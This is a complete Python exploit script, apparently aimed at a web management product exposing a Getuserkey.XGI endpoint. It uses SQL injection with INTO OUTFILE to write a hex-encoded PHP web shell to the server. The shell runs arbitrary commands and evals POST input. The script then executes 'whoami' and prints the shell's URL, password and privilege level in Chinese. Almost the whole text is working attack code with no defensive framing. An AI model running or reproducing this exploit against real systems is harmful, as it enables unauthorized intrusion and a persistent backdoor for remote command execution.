import requests
import time
import re
import sys
import binascii

def get_cookie():
    geturl = chk_url
    res = requests.get(geturl, verify=False, allow_redirects=False)
    cookies = requests.utils.dict_from_cookiejar(res.cookies)
    return cookies['PHPSESSID']

def get_shell(file_path,cookie):
    poc = """
    <?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);
    $z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);
    $z=array_map('trim',$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;
    return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);
    $w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);
    $w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}
    elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);
    $w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);
    $w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";@eval($_POST['cmd']);?>
    """
    poc_16 = binascii.b2a_hex(poc.encode('utf-8'))
    re_whoami = '<pre>(.*?)</pre>'
    posturl = chk_url+"/Getuserkey.XGI"
    select = "-1' OR 7000=7000 LIMIT 0,1 INTO OUTFILE '{}/webtest.php' LINES TERMINATED BY 0x{}-- AND 'test'='test'".format(file_path,str(poc_16, encoding = "utf8"))
    headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID={}; CookieLanguageName=ZH-CN".format(cookie)}
    postdata = {
                "xjxfun": "changeview",
                "xjxr": "{}".format(str(time.time()*1000).split('.')[0]),
                "xjxargs[]": "{}".format(select)
    }

    code = requests.post(posturl,headers=headers,data=postdata)
    if code.status_code:
        webshell = requests.get('{}/webtest.php'.format(chk_url))
        if webshell.status_code == 200:
            who = requests.get(webshell.url+'?cmd=whoami')
            whoami = re.findall(re_whoami, who.text,re.S|re.M)
            return webshell.url,whoami[0]

def get_path():
    re_path = '<tr><td><b>WEB.*?</b></td><td colspan=.*?>(.*?)</td></tr>'
    url = chk_url+"/testweb.php"
    path_cent = requests.get(url)
    ret = re.findall(re_path, path_cent.text,re.S|re.M)
    return ret[0]

def main():
    file_path = get_path()
    print('\n物理路径：',file_path)
    cookie = get_cookie()
    print('PHPSESSID：',cookie)
    shell = get_shell(file_path,cookie)
    print('WEBSHELL：',shell[0],'密码：cmd ，连接编码：Base64')
    print('权限：',shell[1])
    print('命令执行链接(可更改whoami为其他命令)：',shell[0]+'?cmd=whoami')

if __name__ == '__main__':
    chk_url = sys.argv[1]
    main()